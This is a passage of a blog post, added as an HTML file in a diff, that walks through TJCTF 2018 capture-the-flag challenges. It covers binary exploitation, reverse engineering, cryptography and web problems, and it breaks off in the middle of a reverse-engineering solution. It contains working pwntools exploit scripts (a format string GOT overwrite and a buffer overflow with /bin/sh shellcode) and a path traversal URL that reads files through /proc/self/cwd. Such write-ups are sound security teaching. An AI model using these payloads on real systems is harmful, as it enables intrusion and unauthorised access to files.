@@ -1,0 +1,1595 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		
+		<meta name="author" content="Alan Chang">
+		<meta name="description" content="a random blog about cybersecurity and programming">
+		<meta name="generator" content="Hugo 0.40.3" />
+		<title>TJCTF 2018 Writeup &middot; Alan&#39;s Blog</title>
+		<link rel="shortcut icon" href="https://tcode2k16.github.io/blog/images/favicon.ico">
+		<link rel="stylesheet" href="https://tcode2k16.github.io/blog/css/style.css">
+		<link rel="stylesheet" href="https://tcode2k16.github.io/blog/css/highlight.css">
+
+		
+		<link rel="stylesheet" href="https://tcode2k16.github.io/blog/css/font-awesome.min.css">
+		
+
+		
+		<link href="https://tcode2k16.github.io/blog/index.xml" rel="alternate" type="application/rss+xml" title="Alan&#39;s Blog" />
+		
+
+		
+	</head>
+
+    <body>
+       <nav class="main-nav">
+	
+	
+		<a href='https://tcode2k16.github.io/blog/'> <span class="arrow">←</span>Home</a>
+	
+	<a href='https://tcode2k16.github.io/blog/posts'>Archive</a>
+	<a href='https://tcode2k16.github.io/blog/tags'>Tags</a>
+	<a href='https://tcode2k16.github.io/blog/about'>About</a>
+
+	
+
+	
+	<a class="cta" href="https://tcode2k16.github.io/blog/index.xml">Subscribe</a>
+	
+</nav>
+
+
+        <section id="wrapper" class="post">
+            <article>
+                <header>
+                    <h1>
+                        TJCTF 2018 Writeup
+                    </h1>
+                    <h2 class="headline">
+                    Aug 11, 2018 11:52
+                    · 5233 words
+                    · 25 minute read
+                      <span class="tags">
+                      
+                      
+                          
+                              <a href="https://tcode2k16.github.io/blog/tags/ctf">ctf</a>
+                          
+                              <a href="https://tcode2k16.github.io/blog/tags/cyber-security">cyber-security</a>
+                          
+                              <a href="https://tcode2k16.github.io/blog/tags/write-up">write-up</a>
+                          
+                      
+                      
+                      </span>
+                    </h2>
+                </header>
+                
+                  
+                    <div id="toc">
+                      <nav id="TableOfContents">
+<ul>
+<li><a href="#secure-secrets-binary-exploitation">Secure Secrets - Binary Exploitation</a>
+<ul>
+<li><a href="#problem">Problem</a></li>
+<li><a href="#solution">Solution</a></li>
+</ul></li>
+<li><a href="#online-banking-binary-exploitation">Online Banking - Binary Exploitation</a>
+<ul>
+<li><a href="#problem-1">Problem</a></li>
+<li><a href="#solution-1">Solution</a></li>
+</ul></li>
+<li><a href="#validator-reverse-engineering">Validator - Reverse Engineering</a>
+<ul>
+<li><a href="#problem-2">Problem</a></li>
+<li><a href="#solution-2">Solution</a></li>
+</ul></li>
+<li><a href="#future-canary-lab-binary-exploitation">Future Canary Lab - Binary Exploitation</a>
+<ul>
+<li><a href="#problem-3">Problem</a></li>
+<li><a href="#solution-3">Solution</a></li>
+</ul></li>
+<li><a href="#classic-cryptography">Classic - Cryptography</a>
+<ul>
+<li><a href="#problem-4">Problem</a></li>
+<li><a href="#solution-4">Solution</a></li>
+</ul></li>
+<li><a href="#programmable-hyperlinked-pasta-web">Programmable Hyperlinked Pasta - Web</a>
+<ul>
+<li><a href="#problem-5">Problem</a></li>
+<li><a href="#solution-5">Solution</a></li>
+</ul></li>
+<li><a href="#bricked-binary-reverse-engineering">Bricked Binary - Reverse Engineering</a>
+<ul>
+<li><a href="#problem-6">Problem</a></li>
+<li><a href="#solution-6">Solution</a></li>
+</ul></li>
+<li><a href="#interference-miscellaneous">Interference - Miscellaneous</a>
+<ul>
+<li><a href="#problem-7">Problem</a></li>
+<li><a href="#solution-7">Solution</a></li>
+</ul></li>
+<li><a href="#mirror-mirror-miscellaneous">Mirror Mirror - Miscellaneous</a>
+<ul>
+<li><a href="#problem-8">Problem</a></li>
+<li><a href="#solution-8">Solution</a></li>
+</ul></li>
+<li><a href="#ssleepy-forensics">Ssleepy - forensics</a>
+<ul>
+<li><a href="#problem-9">Problem</a></li>
+<li><a href="#solution-9">Solution</a></li>
+</ul></li>
+<li><a href="#bad-cipher-reverse-engineering">Bad Cipher - Reverse Engineering</a>
+<ul>
+<li><a href="#problem-10">Problem</a></li>
+<li><a href="#solution-10">Solution</a></li>
+</ul></li>
+<li><a href="#request-me-web">Request Me - Web</a>
+<ul>
+<li><a href="#problem-11">Problem</a></li>
+<li><a href="#solution-11">Solution</a></li>
+</ul></li>
+<li><a href="#python-reversing-reverse-engineering">Python Reversing - Reverse Engineering</a>
+<ul>
+<li><a href="#problem-12">Problem</a></li>
+<li><a href="#solution-12">Solution</a></li>
+</ul></li>
+<li><a href="#tilted-troop-binary-exploitation">Tilted Troop - Binary Exploitation</a>
+<ul>
+<li><a href="#problem-13">Problem</a></li>
+<li><a href="#solution-13">Solution</a></li>
+</ul></li>
+<li><a href="#caesar-s-complication-cryptography">Caesar&rsquo;s Complication - Cryptography</a>
+<ul>
+<li><a href="#problem-14">Problem</a></li>
+<li><a href="#solution-14">Solution</a></li>
+</ul></li>
+<li><a href="#the-abyss-miscellaneous">The Abyss - Miscellaneous</a>
+<ul>
+<li><a href="#problem-15">Problem</a></li>
+<li><a href="#solution-15">Solution</a></li>
+</ul></li>
+<li><a href="#super-secure-secrets-binary-exploitation">Super Secure Secrets - Binary Exploitation</a>
+<ul>
+<li><a href="#problem-16">Problem</a></li>
+<li><a href="#solution-16">Solution</a></li>
+</ul></li>
+<li><a href="#speedy-security-miscellaneous">Speedy Security - Miscellaneous</a>
+<ul>
+<li><a href="#problem-17">Problem</a></li>
+<li><a href="#solution-17">Solution</a></li>
+</ul></li>
+</ul>
+</nav>
+                    </div>
+                  
+                
+                <section id="post-body">
+                    
+
+<h1 id="secure-secrets-binary-exploitation">Secure Secrets - Binary Exploitation</h1>
+
+<h2 id="problem">Problem</h2>
+
+<p>Written by evanyeyeye</p>
+
+<p>I am responsible for architecting the most recent paradigm in our modern technological revolution: Secure Secrets. Why don&rsquo;t you <a href="/blog/tjctf-2018-writeup/Secure%20Secrets/secure">try</a> it out?</p>
+
+<h2 id="solution">Solution</h2>
+
+<p>By playing around with the binary, we soon discover a <a href="https://www.youtube.com/watch?v=0WvrSfcdq1I">format string vulnerability</a>:</p>
+
+<pre><code class="language-text">Introducing Secure Secrets TM -- a revolutionary service for storing your most sensitive messages.
+NEW FEATURE COMING SOON: Safely store your darkest secrets as well!
+
+How does this work?
+First, choose a strong password to protect your message:
+&gt; 123
+Good choice! Now, simply leave your message below:
+&gt; %x %x %x
+All done!
+You can rest easy knowing that we are 100% unhackable.
+
+For proof of concept, try accessing your message below.
+You must input the correct password:
+&gt; 123
+
+ffe2c22c f7f515c0 fbad2887
+
+Tada! Hope you liked our service!
+</code></pre>
+
+<p>Furthermore, there is a function called <code>sym.get_secret</code> in the binary that basically prints out the flag:</p>
+
+<pre><code>vagrant@ubuntu-bionic:/ctf/tjctf/Secure Secrets$ r2 ./secure
+ -- This computer has gone to sleep.
+[0x080485e0]&gt; aaaa
+[x] Analyze all flags starting with sym. and entry0 (aa)
+[x] Analyze function calls (aac)
+[x] Analyze len bytes of instructions for references (aar)
+[ ] Constructing a function name for fcn.* and sym.func.* functions (aan[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
+[x] Type matching analysis for all functions (afta)
+[x] Emulate code to find computed references (aae)
+[x] Analyze consecutive function (aat)
+[0x080485e0]&gt; afl
+0x080484c4    3 35           sym._init
+0x08048500    1 6            sym.imp.setbuf
+0x08048510    1 6            sym.imp.strcmp
+0x08048520    1 6            sym.imp.printf
+0x08048530    1 6            sym.imp.__isoc99_fscanf
+0x08048540    1 6            sym.imp.fgets
+0x08048550    1 6            sym.imp.__stack_chk_fail
+0x08048560    1 6            sym.imp.getegid
+0x08048570    1 6            sym.imp.puts
+0x08048580    1 6            sym.imp.exit
+0x08048590    1 6            sym.imp.__libc_start_main
+0x080485a0    1 6            sym.imp.fopen
+0x080485b0    1 6            sym.imp.memset
+0x080485c0    1 6            sym.imp.setresgid
+0x080485d0    1 6            sub.__gmon_start_5d0
+0x080485e0    1 33           entry0
+0x08048610    1 4            sym.__x86.get_pc_thunk.bx
+0x08048620    4 43           sym.deregister_tm_clones
+0x08048650    4 53           sym.register_tm_clones
+0x08048690    3 30           sym.__do_global_dtors_aux
+0x080486b0    4 43   -&gt; 40   entry1.init
+0x080486db    1 56           sym.lets_be_friends
+0x08048713    6 128          sym.get_secret
+0x08048793    4 196          sym.set_message
+0x08048857    6 210          sym.get_message
+0x08048929    1 121          sym.main
+0x080489b0    4 93           sym.__libc_csu_init
+0x08048a10    1 2            sym.__libc_csu_fini
+0x08048a14    1 20           sym._fini
+[0x080485e0]&gt; pdf @ sym.get_secret
+/ (fcn) sym.get_secret 128
+|   sym.get_secret ();
+|           ; var file*stream @ ebp-0x50
+|           ; var char *local_4ch @ ebp-0x4c
+|           ; var int local_ch @ ebp-0xc
+|           0x08048713      55             push ebp
+|           0x08048714      89e5           mov ebp, esp
+|           0x08048716      83ec58         sub esp, 0x58               ; 'X'
+|           0x08048719      65a114000000   mov eax, dword gs:[0x14]    ; [0x14:4]=-1 ; 20
+|           0x0804871f      8945f4         mov dword [local_ch], eax
+|           0x08048722      31c0           xor eax, eax
+|           0x08048724      83ec08         sub esp, 8
+|           0x08048727      68308a0408     push 0x8048a30              ; &quot;r&quot; ; const char *mode
+|           0x0804872c      68328a0408     push str.flag.txt           ; 0x8048a32 ; &quot;flag.txt&quot; ; const char *filename
+|           0x08048731      e86afeffff     call sym.imp.fopen          ; file*fopen(const char *filename, const char *mode)
+|           0x08048736      83c410         add esp, 0x10
+|           0x08048739      8945b0         mov dword [stream], eax
+|           0x0804873c      837db000       cmp dword [stream], 0
+|       ,=&lt; 0x08048740      7512           jne 0x8048754
+|       |   0x08048742      83ec0c         sub esp, 0xc
+|       |   0x08048745      683b8a0408     push str.Secret_could_not_be_accessed. ; 0x8048a3b ; &quot;Secret could not be accessed.&quot; ; const char *s
+|       |   0x0804874a      e821feffff     call sym.imp.puts           ; int puts(const char *s)
+|       |   0x0804874f      83c410         add esp, 0x10
+|      ,==&lt; 0x08048752      eb2b           jmp 0x804877f
+|      ||   ; CODE XREF from sym.get_secret (0x8048740)
+|      |`-&gt; 0x08048754      83ec04         sub esp, 4
+|      |    0x08048757      8d45b4         lea eax, [local_4ch]
+|      |    0x0804875a      50             push eax                    ;  ...
+|      |    0x0804875b      68598a0408     push 0x8048a59              ; &quot;%s&quot; ; const char *format
+|      |    0x08048760      ff75b0         push dword [stream]         ; FILE *stream
+|      |    0x08048763      e8c8fdffff     call sym.imp.__isoc99_fscanf ; int fscanf(FILE *stream, const char *format, ...)
+|      |    0x08048768      83c410         add esp, 0x10
+|      |    0x0804876b      83ec08         sub esp, 8
+|      |    0x0804876e      8d45b4         lea eax, [local_4ch]
+|      |    0x08048771      50             push eax
+|      |    0x08048772      685c8a0408     push str.Here_is_your_secret:__s ; 0x8048a5c ; &quot;Here is your secret: %s\n&quot; ; const char *format
+|      |    0x08048777      e8a4fdffff     call sym.imp.printf         ; int printf(const char *format)
+|      |    0x0804877c      83c410         add esp, 0x10
+|      |    ; CODE XREF from sym.get_secret (0x8048752)
+|      `--&gt; 0x0804877f      90             nop
+|           0x08048780      8b45f4         mov eax, dword [local_ch]
+|           0x08048783      653305140000.  xor eax, dword gs:[0x14]
+|       ,=&lt; 0x0804878a      7405           je 0x8048791
+|       |   0x0804878c      e8bffdffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
+|       |   ; CODE XREF from sym.get_secret (0x804878a)
+|       `-&gt; 0x08048791      c9             leave
+\           0x08048792      c3             ret
+[0x080485e0]&gt;
+</code></pre>
+
+<p>Utilizing these two pieces of information, we can try to override a libc function in the <a href="https://www.youtube.com/watch?v=kUk5pw4w0h4">GOT</a> (<code>puts</code> in this case) with the <code>get_secret</code> function using two short writes similar to <a href="https://www.youtube.com/watch?v=t1LH9D5cuK4">this</a>.</p>
+
+<p>Code:</p>
+
+<pre><code class="language-python">from pwn import *
+
+# context.log_level = 'debug'
+context.binary = './secure'
+
+# sh = process('./secure')
+sh = remote('problem1.tjctf.org', 8008)
+
+secret_addr = 0x08048713
+puts_got = 0x0804a028
+
+payload = p32(puts_got)
+payload += p32(puts_got+2)
+payload += '%35$34571x'
+payload += '%35$n'
+payload += '%36$33009x'
+payload += '%36$n'
+payload += '\n'
+
+sh.sendafter('&gt; ', '12345\n')
+sh.sendafter('&gt; ', payload)
+sh.sendafter('&gt; ', '12345\n')
+sh.interactive()
+</code></pre>
+
+<p>Flag: <code>tjctf{n1c3_j0b_y0u_r34lly_GOT_m3_600d}</code></p>
+
+<h1 id="online-banking-binary-exploitation">Online Banking - Binary Exploitation</h1>
+
+<h2 id="problem-1">Problem</h2>
+
+<p>Written by nthistle</p>
+
+<p>Try out our new online banking service!</p>
+
+<p><a href="/blog/tjctf-2018-writeup/Online%20Banking/problem">binary</a> <a href="/blog/tjctf-2018-writeup/Online%20Banking/problem.c">source</a></p>
+
+<h2 id="solution-1">Solution</h2>
+
+<p>Reading the C source code, we quickly notice that the <code>verify_pin</code> function is vulnerable to a buffer overflow attack where it tries to read <code>NAME_SIZE+1</code> bytes into a <code>PIN_SIZE+1</code> bytes array:</p>
+
+<pre><code class="language-c">int verify_pin(char* pin) {
+    char pin_check[PIN_SIZE+1];
+    printf(&quot;Please verify your PIN first:\nPIN: &quot;);
+    fgets(pin_check, NAME_SIZE+1, stdin);
+    for(int i = 0; i &lt; 4; i ++) {
+        if(pin[i] != pin_check[i])
+            return 0;
+    }
+    return 1;
+}
+</code></pre>
+
+<p>This allows us to control the instruction pointer of the program. The next step would be to figure out a way of reading the flag.</p>
+
+<p>Conveniently, we are given the ability to write up to 33 bytes into the program memory using the Name input and the program is not <a href="https://en.wikipedia.org/wiki/NX_bit">NX</a> protected:</p>
+
+<pre><code>vagrant@ubuntu-bionic:/ctf/tjctf/Online Banking$ r2 ./problem
+ -- I nodejs so hard my exams. What a nodejs!
+[0x00400680]&gt; i~nx
+nx       false
+</code></pre>
+
+<p>This gives us a perfect condition to use a shellcode.</p>
+
+<p>Code:</p>
+
+<pre><code class="language-python">from pwn import *
+
+# context.log_level = 'debug'
+context.binary = './problem'
+
+# sh = process('./problem')
+sh = remote('problem1.tjctf.org', 8005)
+
+name_addr = 0x006010a0
+
+PIN = '1234'
+
+# from https://www.exploit-db.com/exploits/36858/
+shellcode = '\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05'
+
+payload = 'a'*(5+4) + 'b'*8 + p64(name_addr)
+
+sh.sendlineafter('Name: ', shellcode)
+sh.sendlineafter('PIN: ', PIN)
+
+sh.sendlineafter('q - quit\n', 'd')
+sh.sendlineafter('PIN: ', payload)
+
+sh.interactive()
+</code></pre>
+
+<p>Flag: <code>tjctf{d4n6_17_y0u_r0pp3d_m3_:(}</code></p>
+
+<h1 id="validator-reverse-engineering">Validator - Reverse Engineering</h1>
+
+<h2 id="problem-2">Problem</h2>
+
+<p>Written by evanyeyeye</p>
+
+<p>I found a flag validation <a href="/blog/tjctf-2018-writeup/Validator/flagcheck">program</a>. Do what you want with it.</p>
+
+<h2 id="solution-2">Solution</h2>
+
+<p>The program first loads a partial flag in to memory and then patches the flag before the comparison:</p>
+
+<pre><code>vagrant@ubuntu-bionic:/ctf/tjctf/Validator$ r2 ./flagcheck
+ -- Use /m to carve for known magic headers. speedup with search.
+[0x08048400]&gt; aaaa
+...
+[0x08048400]&gt; pdf @ main
+/ (fcn) main 310
+|   main (int arg_4h);
+...
+|           0x08048520      c745c8746a63.  mov dword [s1], 0x74636a74  ; 'tjct'
+|           0x08048527      c745cc667b6a.  mov dword [local_34h], 0x756a7b66 ; 'f{ju'
+|           0x0804852e      c745d035375f.  mov dword [local_30h], 0x635f3735 ; '57_c'
+|           0x08048535      c745d4346c6c.  mov dword [local_2ch], 0x5f6c6c34 ; '4ll_'
+|           0x0804853c      c745d86d335f.  mov dword [local_28h], 0x725f336d ; 'm3_r'
+|           0x08048543      c745dc337633.  mov dword [local_24h], 0x72337633 ; '3v3r'
+|           0x0804854a      c745e035335f.  mov dword [local_20h], 0x365f3335 ; '53_6'
+|           0x08048551      c745e430645f.  mov dword [local_1ch], 0x665f6430 ; '0d_f'
+|           0x08048558      c745e872306d.  mov dword [local_18h], 0x5f6d3072 ; 'r0m_'
+|           0x0804855f      c745ec6e3077.  mov dword [local_14h], 0x5f77306e ; 'n0w_'
+|           0x08048566      c745f0306e7d.  mov dword [local_10h], 0x7d6e30 ; '0n}'
+|           0x0804856d      833802         cmp dword [eax], 2          ; [0x2:4]=-1 ; 2
+...
+|      ||   0x0804858f      c645db33       mov byte [local_25h], 0x33  ; '3' ; 51
+|      ||   0x08048593      c645de33       mov byte [local_22h], 0x33  ; '3' ; 51
+|      ||   0x08048597      c645e033       mov byte [local_20h], 0x33  ; '3' ; 51
+|      ||   0x0804859b      c645dc35       mov byte [local_24h], 0x35  ; section_end..comment
+|      ||   0x0804859f      c645dd72       mov byte [local_23h], 0x72  ; 'r' ; 114
+|      ||   0x080485a3      c645e172       mov byte [local_1fh], 0x72  ; 'r' ; 114
+|      ||   0x080485a7      c645df76       mov byte [local_21h], 0x76  ; 'v' ; 118
+|      ||   0x080485ab      8b45c4         mov eax, dword [s2]
+...
+</code></pre>
+
+<p>To solve the problem, we can set a breakpoint after the flag is patched and extract it from memory:</p>
+
+<pre><code>vagrant@ubuntu-bionic:/ctf/tjctf/Validator$ r2 ./flagcheck
+[0x08048400]&gt; ood aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+...
+[0xf7fc4c70]&gt; aaaa
+...
+[0xf7fc4c70]&gt; pdf @ main
+...
+|      ||   0x0804858f      c645db33       mov byte [local_25h], 0x33  ; '3' ; 51
+|      ||   0x08048593      c645de33       mov byte [local_22h], 0x33  ; '3' ; 51
+|      ||   0x08048597      c645e033       mov byte [local_20h], 0x33  ; '3' ; 51
+|      ||   0x0804859b      c645dc35       mov byte [local_24h], 0x35  ; section_end..comment
+|      ||   0x0804859f      c645dd72       mov byte [local_23h], 0x72  ; 'r' ; 114
+|      ||   0x080485a3      c645e172       mov byte [local_1fh], 0x72  ; 'r' ; 114
+|      ||   0x080485a7      c645df76       mov byte [local_21h], 0x76  ; 'v' ; 118
+|      ||   0x080485ab      8b45c4         mov eax, dword [local_3ch]
+...
+[0xf7fc4c70]&gt; db 0x080485ab
+[0xf7fc4c70]&gt; dc
+hit breakpoint at: 80485ab
+[0x080485ab]&gt; ps 100 @ ebp-0x50
+\x00\x00\x00\x00\x00n\x08\xc8\x09\x00\x00\x008\x84\x9d\xff\xa9D\xe0\xf7\x04l\x9d\xfftjctf{ju57_c4ll_m3_35r3v3r_60d_fr0m_n0w_0n}\x00\x00n\x08\xc8\xb09\xfd\xf7pk\x9d\xff\x00\x00\x00\x00\x81\xce\xde\xf7\x00\xc0\xfa\xf7\x00\xc0\xfa\xf7\x00\x00\x00\x00
+</code></pre>
+
+<p>Flag: <code>tjctf{ju57_c4ll_m3_35r3v3r_60d_fr0m_n0w_0n}</code></p>
+
+<h1 id="future-canary-lab-binary-exploitation">Future Canary Lab - Binary Exploitation</h1>
+
+<h2 id="problem-3">Problem</h2>
+
+<p>Written by evanyeyeye</p>
+
+<p>The world renowned Future Canary Lab is looking for a new lab member. Good luck with your <a href="/blog/tjctf-2018-writeup/Future Canary Lab/interview">interview</a> (<a href="/blog/tjctf-2018-writeup/Future Canary Lab/interview.c">source</a>)!</p>
+
+<h2 id="solution-3">Solution</h2>
+
+<p>Looking at the source code, our goal would be to override <code>i</code>, <code>j</code>, and <code>secret</code>, but the only way to do so is via the <code>gets</code> call that first overrides the canary, a buffer of ten random integers that we cannot change.</p>
+
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+#define FLAG &quot;-----REDACTED-----&quot;
+
+void interview(int secret) {
+
+    int i, j;
+    int canary[10];
+    char name[64];
+    int check[10];
+
+    for (i = 0; i &lt; 10; ++i) {
+        canary[i] = check[i] = rand();
+    }
+
+    printf(&quot;Welcome to the Future Canary Lab!\n&quot;);
+    printf(&quot;What is your name?\n&quot;);
+    gets(name);
+
+    for (j = 0; j &lt; 10; ++j) {
+        if (canary[j] != check[j]) {
+            printf(&quot;Alas, it would appear you lack the time travel powers we desire.\n&quot;);
+            exit(0);
+        }
+    }
+
+    if (secret - i + j == 0xdeadbeef) {
+        printf(&quot;You are the one. This must be the choice of Stacks Gate!\n&quot;);
+        printf(&quot;Here is your flag: %s\n&quot;, FLAG);
+    } else {
+        printf(&quot;Begone, FBI Spy!\n&quot;);
+    }
+
+    exit(0);
+}
+
+int main() {
+
+    gid_t gid = getegid();
+    setresgid(gid, gid, gid);
+
+    setbuf(stdout, NULL);
+
+    srand(time(NULL));
+
+    interview(0);
+
+    return 0;
+}
+</code></pre>
+
+<p>As it turns out the solution would be to predict the future :). Because the <code>random</code> function is seeded with the current time, we have a chance of reproducing the same sequence given the time:</p>
+
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main(int argc, char * argv []) {
+
+    gid_t gid = getegid();
+    setresgid(gid, gid, gid);
+
+    setbuf(stdout, NULL);
+
+    srand(time(NULL)+atoi(argv[1]));
+
+    for (int i = 0; i &lt; 10; ++i) {
+        printf(&quot;%d &quot;, rand());
+    }
+    printf(&quot;\n&quot;);
+
+    return 0;
+}
+</code></pre>
+
+<p>This is a program that spits out ten random integers that will be generated x seconds in the future. Combining this with the python script below, we are able to safely override our variables without changing the canary:</p>
+
+<pre><code class="language-python">from pwn import *
+import subprocess
+
+context.log_level = 'debug'
+context.binary = './interview'
+
+# sh = process('./interview')
+sh = remote('problem1.tjctf.org', 8000)
+
+r = list(map(lambda x: p32(int(x)), subprocess.check_output([&quot;./exploit&quot;, '0']).strip().split(' ')))
+
+payload = 'a'*64 # pad
+payload += ''.join(r) # canary
+payload += p32(0x01010101) # j
+payload += p32(0x01010101) # i
+for i in range(20):
+  payload += p32(3752771558)
+
+sh.sendlineafter('?\n', payload)
+sh.interactive()
+</code></pre>
+
+<p>Flag: <code>tjctf{3l_p5y_k0n6r00_0ur_n3w357_l4b_m3mb3r!}</code></p>
+
+<h1 id="classic-cryptography">Classic - Cryptography</h1>
+
+<h2 id="problem-4">Problem</h2>
+
+<p>Written by etherlyt</p>
+
+<p>My primes might be close in size but they&rsquo;re big enough that it shouldn&rsquo;t matter right? <a href="/blog/tjctf-2018-writeup/Classic/rsa.txt">rsa.txt</a></p>
+
+<h2 id="solution-4">Solution</h2>
+
+<p>Just factor n. In this case, I used <a href="https://www.alpertron.com.ar/ECM.HTM">this tool</a> to do the job.</p>
+
+<p>Code:</p>
+
+<pre><code class="language-python"># https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e
+e = 65537
+n = 128299637852747781491257187842028484364103855748297296704808405762229741626342194440837748106022068295635777844830831811978557490708404900063082674039252789841829590381008343327258960595508204744589399243877556198799438322881052857422197506822302290812621883700357890208069551876513290323124813780520689585503
+c = 43160414063424128744492209010823042660025171642991046645158489731385945722740307002278661617111192557638773493117905684302084789590107080892369738949935010170735247383608959796206619491522997896941432858113478736544386518678449541064813172833593755715667806740002726487780692635238838746604939551393627585159
+p = 11326943005628119672694629821649856331564947811949928186125208046290130000912120768861173564277210907403841603312764378561200102283658817695884193223692869
+q = 11326943005628119672694629821649856331564947811949928186125208046290130000912216246378177299696220728414241927034282796937320547048361486068608744598351187
+
+def egcd(a, b):
+    x,y, u,v = 0,1, 1,0
+    while a != 0:
+        q, r = b//a, b%a
+        m, n = x-u*q, y-v*q
+        b,a, x,y, u,v = a,r, u,v, m,n
+        gcd = b
+    return gcd, x, y
+
+# Compute phi(n)
+phi = (p - 1) * (q - 1)
+
+# Compute modular inverse of e
+gcd, a, b = egcd(e, phi)
+d = a
+
+# Decrypt ciphertext
+pt = pow(c, d, n)
+print( &quot;pt: &quot; + hex(pt) )
+</code></pre>
+
+<p>Flag: <code>tjctf{1_l1ke_squares}</code></p>
+
+<h1 id="programmable-hyperlinked-pasta-web">Programmable Hyperlinked Pasta - Web</h1>
+
+<h2 id="problem-5">Problem</h2>
+
+<p>Written by nthistle</p>
+
+<p>Check out my new site! PHP is so cool!</p>
+
+<h2 id="solution-5">Solution</h2>
+
+<p>The website also have a Spanish version via this url:</p>
+
+<blockquote>
+<p><a href="https://programmable_hyperlinked_pasta.tjctf.org/?lang=es.php">https://programmable_hyperlinked_pasta.tjctf.org/?lang=es.php</a></p>
+</blockquote>
+
+<p><code>es.php</code> is definitely a file, so I tried:</p>
+
+<blockquote>
+<p><a href="https://programmable_hyperlinked_pasta.tjctf.org/?lang=flag.txt">https://programmable_hyperlinked_pasta.tjctf.org/?lang=flag.txt</a></p>
+</blockquote>
+
+<p>This didn&rsquo;t work, so I attempted:</p>
+
+<blockquote>
+<p><a href="https://programmable_hyperlinked_pasta.tjctf.org/?lang=../../../../../../../../../proc/self/cwd/flag.txt">https://programmable_hyperlinked_pasta.tjctf.org/?lang=../../../../../../../../../proc/self/cwd/flag.txt</a></p>
+</blockquote>
+
+<p>Problem solved!</p>
+
+<p>Notes:</p>
+
+<ul>
+<li>doing <code>../../../../../../../../../</code> will bring you to <code>/</code> eventually</li>
+<li><code>/proc/self</code> always refer to the current program</li>
+<li><code>/proc/self/cwd</code> is a symbolic link to the current working directory of the program</li>
+</ul>
+
+<p>Flag: <code>tjctf{l0c4l_f1l3_wh4t?}</code></p>
+
+<h1 id="bricked-binary-reverse-engineering">Bricked Binary - Reverse Engineering</h1>
+
+<h2 id="problem-6">Problem</h2>
+
+<p>Written by evanyeyeye</p>
+
+<p>Earlier, I input my flag to this <a href="/blog/tjctf-2018-writeup/Bricked Binary/hashgen">image</a> and received 22c15d5f23238a8fff8d299f8e5a1c62 as the output. Unfortunately, later on I broke the program and also managed to lose my flag. Can you find it for me?</p>
+
+<p>The flag is not in standard flag format.</p>
+
+<h2 id="solution-6">Solution</h2>
+
+<p>Because the binary is bricked, tools like angr would not work in this case; therefore, I went straight to reversing the algorithm by hand using ida.</p>
+
+<p>Here is the equivalent algorithm rewritten in python:</p>
+
+<pre><code class="language-python">u = [
+  0x04, 0x07, 0x05, 0x08, 0x0C, 0x0A, 0x06, 0x02, 0x0D, 0x01, 0x00, 0x0E, 0x09, 0x0B, 0x03, 0x0F,
+  0xCA, 0xDE, 0x14, 0x94, 0x29, 0xE9, 0x44, 0x4B, 0x84, 0xE4, 0xD7, 0x3A, 0x62, 0x3F, 0xEF, 0xB7,
+  0x7A, 0x9F, 0xF7, 0xFD, 0x56, 0x52, 0xB9, 0xC7, 0x3E, 0x5C, 0xC4, 0xD5, 0xE1, 0xC9, 0x93, 0x76,
+  0x48, 0x88, 0xBF, 0x67, 0xA4, 0xEA, 0xD0, 0x17, 0xCE, 0x98, 0xBB, 0xAC, 0x1C, 0xAB, 0xC1, 0x26,
+  0xA6, 0x83, 0xDD, 0x10, 0x96, 0x9D, 0x80, 0x19, 0x9C, 0xAF, 0x91, 0xD8, 0xAD, 0xA5, 0xB4, 0x71,
+  0xDA, 0xF9, 0x8C, 0x77, 0xA8, 0x75, 0xA7, 0x55, 0x3B, 0xFE, 0xE8, 0xED, 0x61, 0x24, 0x95, 0x54,
+  0x63, 0xAE, 0x4A, 0xDF, 0x31, 0x36, 0xF3, 0x8D, 0x1D, 0x59, 0x47, 0x5D, 0x74, 0xC0, 0x6C, 0x22,
+  0x69, 0xBE, 0xEE, 0x8A, 0x34, 0xD3, 0x15, 0x70, 0xBC, 0xF0, 0x97, 0xF4, 0xE6, 0xD4, 0x4C, 0xF1,
+  0x79, 0xB8, 0x73, 0xDC, 0x35, 0xD2, 0xCB, 0x5F, 0x8E, 0xC8, 0x38, 0x32, 0xFB, 0xFA, 0x7B, 0xCD,
+  0x5A, 0x90, 0xA1, 0xA3, 0x58, 0x8B, 0xB0, 0xD9, 0xB3, 0x7D, 0xEB, 0xD1, 0x78, 0xFC, 0x86, 0x50,
+  0xBD, 0x39, 0xC2, 0x5E, 0xBA, 0x30, 0x23, 0x43, 0x28, 0xCF, 0x6E, 0xE5, 0x51, 0xDB, 0xB5, 0xA9,
+  0xE7, 0x20, 0x21, 0x6A, 0xB2, 0xF6, 0x42, 0xE3, 0xE0, 0x4F, 0x27, 0x81, 0x2B, 0x7E, 0xA2, 0xF5,
+  0x89, 0xD6, 0xFF, 0x12, 0x46, 0x40, 0x9A, 0x60, 0x7F, 0x2D, 0x13, 0x1F, 0x87, 0xCC, 0x1A, 0x92,
+  0x11, 0x2C, 0xB1, 0x57, 0x85, 0xC6, 0xB6, 0x66, 0x82, 0x6B, 0xC3, 0x1B, 0x16, 0x6F, 0x37, 0xE2,
+  0x53, 0x1E, 0x6D, 0x4E, 0x45, 0x64, 0x2F, 0x72, 0xC5, 0x65, 0x7C, 0x25, 0x41, 0x49, 0xF8, 0x3C,
+  0x2E, 0xAA, 0x33, 0x8F, 0x4D, 0x68, 0x9E, 0x5B, 0x3D, 0xEC, 0x99, 0xA0, 0x9B, 0x18, 0xF2, 0x2A
+]
+
+v = [
+  0x81, 0xCD, 0x0A, 0x73, 0xB3, 0x3B, 0x32, 0xB6, 0x6E, 0x7C, 0x31, 0x57, 0xD1, 0xC5, 0x15, 0x3A,
+  0x92, 0xB4, 0xE2, 0x51, 0xAE, 0x42, 0x55, 0x41, 0xE1, 0x70, 0x30, 0x1A, 0x02, 0x84, 0xA2, 0xE7,
